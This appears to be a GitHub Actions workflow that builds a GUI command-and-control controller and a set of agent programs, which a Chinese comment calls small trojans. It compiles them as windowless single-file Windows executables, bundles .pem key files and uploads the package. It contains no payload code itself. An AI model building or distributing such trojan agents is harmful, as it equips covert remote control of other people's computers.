name: Build GUI C2 Release

on: [push]

jobs:
  build-windows:
    name: Build GUI Master and Agents for Windows
    runs-on: windows-latest

    steps:
    - name: Check out repository
      uses: actions/checkout@v4

    - name: Set up Python
      uses: actions/setup-python@v5
      with:
        python-version: '3.10'

    - name: Install dependencies
      run: |
        python -m pip install --upgrade pip
        pip install pyinstaller

    - name: Build GUI Master and Agents
      run: |
        mkdir -p release_pack/executables
        
        # 1. 编译刚刚创建的可视化主控端（带 --noconsole，生成好看的图形界面窗口）
        pyinstaller --onefile --noconsole --distpath ./release_pack/executables app/c2_gui_master.py
        
        # 2. 编译所有客户端（小马）
        foreach ($file in Get-ChildItem -Path "app" -Filter "agent_*.py") {
            Write-Host "Compiling Agent: $($file.Name)"
            pyinstaller --onefile --noconsole --distpath ./release_pack/executables "app/$($file.Name)"
        }

    - name: Copy necessary assets
      run: |
        if (Test-Path "app/*.pem") {
            Copy-Item "app/*.pem" "release_pack/executables/"
        }
        Write-Host "Assets copied successfully."

    - name: Upload release package
      uses: actions/upload-artifact@v4
      with:
        name: GUI-C2-Release-Package
        path: release_pack/
